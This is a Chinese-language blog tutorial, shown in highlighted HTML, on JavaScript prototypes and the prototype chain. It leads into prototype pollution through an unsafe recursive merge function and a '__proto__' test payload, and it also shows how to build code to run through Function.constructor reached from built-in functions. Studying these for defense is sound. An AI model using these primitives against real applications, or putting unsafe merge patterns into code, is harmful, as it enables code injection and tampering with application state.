&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bar&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()).&lt;/span>&lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可是这样的写法会造成一个问题，即每当我们新建一个&lt;code>Foo&lt;/code>对象时，&lt;code>this.show = function()&lt;/code>这样的代码就会执行一次，&lt;code>show&lt;/code>方法被绑定在对象上而不是类中；我们希望创建类时只创建一次&lt;code>show&lt;/code>方法，这时候需要使用原型&lt;code>prototype&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bar&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">show&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">bar&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">show&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>prototype&lt;/code>是类&lt;code>Foo&lt;/code>的一个属性，而所有用&lt;code>Foo&lt;/code>类实例化的对象都将拥有这个属性中的全部内容（包括变量和方法），比如上述代码中的&lt;code>foo&lt;/code>对象可以直接调用&lt;code>show&lt;/code>方法/函数&lt;/p>
&lt;p>我们是通过&lt;code>Foo.prototype&lt;/code>来访问&lt;code>Foo&lt;/code>类的原型，但经过&lt;code>Foo&lt;/code>实例化的对象是不能通过&lt;code>.prototype&lt;/code>来访问原型的，而是借助&lt;code>__proto__&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216103317818.png" alt="image-20211216103317818">&lt;/p>
&lt;p>经由类实例化而来的对象可以通过&lt;code>.__proto__&lt;/code>来访问对应类的原型，即&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">__proto__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">Foo&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以总结两点&lt;/p>
&lt;ul>
&lt;li>类自带&lt;code>prototype&lt;/code>属性，经由类实例化来的对象会自动带上&lt;code>prototype&lt;/code>中的属性和方法&lt;/li>
&lt;li>经由类实例化而来的对象可以通过&lt;code>.__proto__&lt;/code>来访问对应类的原型&lt;/li>
&lt;li>经由类实例化而来的对象可以通过&lt;code>.constructor&lt;/code>来获取构造这个实例的本来的函数&lt;/li>
&lt;/ul>
&lt;h3 id="constructor">&lt;code>constructor&lt;/code>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Dog&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">Dog&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sayHi&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;I am&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">d&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Dog&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;yo&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sayHi&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e">// I am yo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">d&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// [Function: Dog]
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最后一行，&lt;code>d.constructor&lt;/code>可以返回构造这个实例的本来的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">(){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// [Function: Function]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">test&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#111">Function&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>任意一个函数的contructor，都将会返回&lt;code>Function.constructor&lt;/code>，而它可以用来构造函数&lt;/p>
&lt;p>利用这一点，我们可以用任意内建函数来构造新的函数了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">f1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[].&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;console.log(123)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;console.log(456)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f1&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e">// 123
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">f2&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e">// 456
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>甚至&amp;hellip;&amp;hellip;..也不是不可以嘛&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">f3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">constructor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;console.log(&amp;#34;abc&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">f3&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#75715e">// abc
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同理，&lt;code>[]&lt;/code>，&lt;code>''&lt;/code>，&lt;code>{}&lt;/code>都是可以的，单独的&lt;code>()&lt;/code>不行 得有数字&lt;/p>
&lt;h3 id="原型链继承">原型链&amp;amp;继承&lt;/h3>
&lt;p>这么好的两个特性被用来实现js的继承机制，举个例子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Father&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">firstName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Lao&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">lastName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Wang&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">Son&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">firstName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ming&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">Son&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">prototype&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Father&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">son&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Son&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Name: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">son&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">firstName&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">son&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">lastName&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Name: Ming Wang
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>son.lastName&lt;/code>被调用后查找&lt;code>lastName&lt;/code>有一个顺序&lt;/p>
&lt;ul>
&lt;li>对象&lt;code>son&lt;/code>&lt;/li>
&lt;li>&lt;code>son.__proto__&lt;/code>&lt;/li>
&lt;li>&lt;code>son.__proto__.__proto__&lt;/code>&lt;/li>
&lt;li>&lt;code>son.__proto__.__proto__.__proto__&lt;/code>&lt;/li>
&lt;li>&lt;code>son.__proto__.__proto__.__proto__.__proto__&lt;/code> -&amp;gt; NULL 结束&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216104636009.png" alt="image-20211216104636009">&lt;/p>
&lt;p>就是js这个在面向对象的继承中使用的查找机制，被称作原型继承链&lt;/p>
&lt;p>————注意在这个查找的过程中并没有出现&lt;code>prototype&lt;/code>，而是通过&lt;code>xyz.__proto__&lt;/code>来暴露&lt;code>prototype&lt;/code>，真正参与查找的 是对象的&lt;code>__proto__&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216132321698.png" alt="image-20211216132321698">&lt;/p>
&lt;p>&lt;img src="https://p5.ssl.qhimg.com/t011cffd77e8d3ec6c6.png" alt="img">&lt;/p>
&lt;p>另外，对于继承的表达方式除了&lt;code>.&lt;/code>还有&lt;code>[]&lt;/code>，后者一般在属性名是动态时使用，两种表达方式是一样的&lt;/p>
&lt;h3 id="原型链污染">原型链污染&lt;/h3>
&lt;p>既然&lt;code>foo.__proto__ == Foo.prototype&lt;/code>，那修改前者是否能直接影响类呢？&lt;/p>
&lt;p>首先需要注意的：&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>What&amp;rsquo;s good to note about this property is that it&amp;rsquo;s implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write. So assigning a new value to the property &amp;ldquo;_&lt;em>proto&lt;/em>_&amp;rdquo; doesn&amp;rsquo;t shadow the inherited value defined on the prototype. The only way to shadow it invovles using &amp;ldquo;Object.defineProperty&amp;rdquo;.&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216141504236.png" alt="image-20211216141504236">&lt;/p>
&lt;p>要注意，只是这样的修改并不足以污染原型链，只是修改当前运行状态下这个对象的属性而已，还要再向上找一级&lt;code>__proto__&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216143104719.png" alt="image-20211216143104719">&lt;/p>
&lt;p>一个正常的栗子&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216105206819.png" alt="image-20211216105206819">&lt;/p>
&lt;p>我们通过&lt;code>foo.__proto__.bar&lt;/code>修改的是&lt;code>foo&lt;/code>的原型，当修改之后调用&lt;code>foo.bar&lt;/code>由于查找顺序的原因并没有立即修改值，而继承自&lt;code>{}&lt;/code>的&lt;code>zoo&lt;/code>对象，其&lt;code>bar&lt;/code>属性已经被污染了&lt;/p>
&lt;p>综上，如果我们可以控制并修改一个对象的原型，就可以影响所有和这个对象来自同一类、父祖类的对象，这就是&lt;strong>原型链污染&lt;/strong>&lt;/p>
&lt;h2 id="应用场景">应用场景&lt;/h2>
&lt;p>常用的两种修改方式&lt;/p>
&lt;ul>
&lt;li>&lt;code>obj[a][b] = value&lt;/code>: &lt;code>obj[__proto__][modify_property] = value&lt;/code>&lt;/li>
&lt;li>&lt;code>obj[a][b][c] = value&lt;/code>: &lt;code>obj[constructor][prototype][modify_property] = value&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>在什么情况下我们可以设置&lt;code>__proto__&lt;/code>的值呢？我们找能控制数组（对象）的键名的操作即可&lt;/p>
&lt;ul>
&lt;li>Object recursive merge&lt;/li>
&lt;li>Object clone&lt;/li>
&lt;li>Property defination by path&lt;/li>
&lt;/ul>
&lt;h3 id="对象merge操作">对象&lt;code>merge&lt;/code>操作&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">source&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#00a8c8">in&lt;/span> &lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">])&lt;/span> &lt;span style="color:#75715e">// !
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">target&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">source&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在第四行的赋值过程中，如果&lt;code>key == '__proto__'&lt;/code>是否会造成原型链污染呢？&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">o1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">o2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">merge&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">o1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">o2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">o1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">a&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">o1&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">o3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">o3&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">b&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112209243.png" alt="image-20211216112209243">&lt;/p>
&lt;p>虽然merge成功了，但是原型链被没有受到污染&lt;/p>
